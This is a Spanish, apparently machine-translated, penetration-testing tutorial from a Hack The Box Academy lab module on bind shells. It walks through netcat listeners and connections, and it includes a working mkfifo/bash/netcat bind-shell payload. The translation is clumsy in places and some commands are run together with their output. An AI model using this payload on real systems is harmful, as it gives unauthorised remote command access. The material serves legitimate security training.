# Atar conchas

En muchos casos, trabajaremos para establecer un shell en un sistema en una red local o remota. Esto significa que buscaremos usar la aplicación del emulador terminal en nuestro cuadro de ataque local para controlar el sistema remoto a través de su carcasa. Esto se hace típicamente usando un`Bind`&/o`Reverse`caparazón.

---

# **¿Qué es?**

Con un caparazón, el`target`El sistema ha comenzado un oyente y espera una conexión del sistema de Pentester (caja de ataque).

### **Ejemplo de enlace**

![](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

Como se ve en la imagen, nos conectaríamos directamente con el`IP address`y`port`escuchando en el objetivo. Puede haber muchos desafíos asociados con obtener un caparazón de esta manera. Aquí hay algunos a considerar:

- Tendría que haber un oyente ya comenzó en el objetivo.
- Si no se inicia un oyente, tendríamos que encontrar una manera de hacer que esto suceda.
- Los administradores generalmente configuran reglas estrictas de firewall entrantes y NAT (con implementación de PAT) en el borde de la red (orientado público), por lo que ya tendríamos que estar en la red interna.
- Los firewalls del sistema operativo (en Windows y Linux) probablemente bloquearán la mayoría de las conexiones entrantes que no están asociadas con aplicaciones confiables basadas en la red.

Los firewalls del sistema operativo pueden ser problemáticos al establecer un shell, ya que necesitamos considerar las direcciones IP, los puertos y la herramienta en uso para que nuestra conexión funcione correctamente. En el ejemplo anterior, se llama a la aplicación utilizada para iniciar el oyente[Gnu netcat](https://en.wikipedia.org/wiki/Netcat). `Netcat` (`nc`) se considera nuestro`Swiss-Army Knife`Dado que puede funcionar a través de enchufes TCP, UDP y UNIX. Es capaz de usar IPv4 e IPv6, abrir y escuchar en sockets, funcionar como un proxy e incluso tratar con la entrada y salida de texto. Usaríamos NC en el cuadro de ataque como nuestro`client`, y el objetivo sería el`server`.

Obtengamos una comprensión más profunda de esto practicando con NetCat y estableciendo una conexión de Shell Bind con un host en la misma red sin restricciones.

---

# **Practicando con GNU Netcat**

Primero, necesitamos generar nuestro cuadro de ataque o Pwnbox y conectarnos al entorno de la red de la Academia. Luego asegúrese de que nuestro objetivo se inicie. En este escenario, interactuaremos con un sistema Ubuntu Linux para comprender la naturaleza de un caparazón. Para hacer esto, usaremos`netcat` (`nc`) en el cliente y el servidor.

Una vez conectado al cuadro de destino con SSH, inicie un oyente de NetCat:

### **No. 1: Servidor - Oyeer de inicio de NetCat de destino**

Atar conchas

```
Target@server:~$ nc -lvnp 7777Listening on [0.0.0.0] (family 0, port 7777)

```

En este caso, el objetivo será nuestro servidor, y el cuadro de ataque será nuestro cliente. Una vez que presionamos Enter, el oyente se inicia y espera una conexión del cliente.

De vuelta en el cliente (cuadro de ataque), usaremos NC para conectarnos al oyente que comenzamos en el servidor.

### **No. 2: Cliente - Box de ataque que se conecta al Target**

Atar conchas

```
xnoxos@htb[/htb]$ nc -nv 10.129.41.200 7777Connection to 10.129.41.200 7777 port [tcp/*] succeeded!

```

Observe cómo estamos utilizando NC en el cliente y el servidor. En el lado del cliente, especificamos la dirección IP del servidor y el puerto en el que configuramos para escuchar (`7777`). Una vez que nos conectamos con éxito, podemos ver un`succeeded!`mensaje en el cliente como se muestra arriba y un`received!`Mensaje en el servidor, como se ve a continuación.

### **No. 3: Servidor: la conexión de recepción de objetivos del cliente**

Atar conchas

```
Target@server:~$ nc -lvnp 7777Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!

```

Sepa que este no es un caparazón adecuado. Es solo una sesión de TCP de NetCat que hemos establecido. Podemos ver su funcionalidad escribiendo un mensaje simple en el lado del cliente y viéndolo recibido en el lado del servidor.

### **No. 4: Cliente - Cuadro de ataque Enviar mensaje Hello Academy**

Atar conchas

```
xnoxos@htb[/htb]$ nc -nv 10.129.41.200 7777Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy

```

Una vez que escribamos el mensaje y presionemos Enter, notaremos que el mensaje se recibe en el lado del servidor.

### **No. 5: Servidor - Target recibe Hello Academy Mensaje**

Atar conchas

```
Victim@server:~$ nc -lvnp 7777Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy

```

Nota: Cuando en la Academia Network (10.129.xx/16) podemos trabajar con otro estudiante de la Academia para conectarse a su caja objetivo y practicar los conceptos presentados en este módulo.

---

# **Establecer un shell de enlace básico con NetCat**

Hemos demostrado que podemos usar NetCat para enviar texto entre el cliente y el servidor, pero este no es un shell de enlace porque no podemos interactuar con el sistema operativo y el sistema de archivos. Solo podemos pasar el texto dentro de la configuración de la tubería por NetCat. Usemos Netcat para servir nuestro caparazón para establecer un shell de enlace real.

En el lado del servidor, necesitaremos especificar el`directory`, `shell`, `listener`, trabaja con algunos`pipelines`, y`input` & `output` `redirection`Para garantizar que se sirva un shell al sistema cuando el cliente intente conectarse.

### **No. 1: Servidor: vinculando un shell bash a la sesión TCP**

Atar conchas

```
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Los comandos anteriores se consideran nuestra carga útil, y entregamos esta carga útil manualmente. Notaremos que los comandos y el código en nuestras cargas útiles diferirán según el sistema operativo del host al que lo entreguemos.

De vuelta en el cliente, use NetCat para conectarse al servidor ahora que se está sirviendo un shell en el servidor.

### **No. 2: Cliente: conectarse para vincular el shell en el objetivo**

Atar conchas

```
xnoxos@htb[/htb]$ nc -nv 10.129.41.200 7777Target@server:~$
```

Notaremos que hemos establecido con éxito una sesión de shell de enlace con el objetivo. Tenga en cuenta que teníamos un control completo sobre nuestro cuadro de ataque y el sistema objetivo en este escenario, lo cual no es típico. Trabajamos a través de estos ejercicios para comprender los conceptos básicos del shell de enlace y cómo funciona sin ningún control de seguridad (enrutadores habilitados para NAT, firewalls de hardware, firewalls de aplicaciones web, IDS, IPS, firewalls de SO, protección de puntos finales, mecanismos de autenticación, etc.) en su lugar o explotaciones necesarias. Esta comprensión fundamental será útil a medida que llegamos a situaciones más desafiantes y escenarios realistas que trabajen con sistemas vulnerables.

Como se mencionó anteriormente en esta sección, también es bueno recordar que la capa de enlace es mucho más fácil de defender. Dado que la conexión se recibirá entrante, es más probable que sea detectado y bloqueado por firewalls, incluso si los puertos estándar se usan al comenzar un oyente. Hay formas de evitar esto utilizando un shell inverso que discutiremos en la siguiente sección.

Ahora, probemos nuestra comprensión de estos conceptos con algunas preguntas de desafío.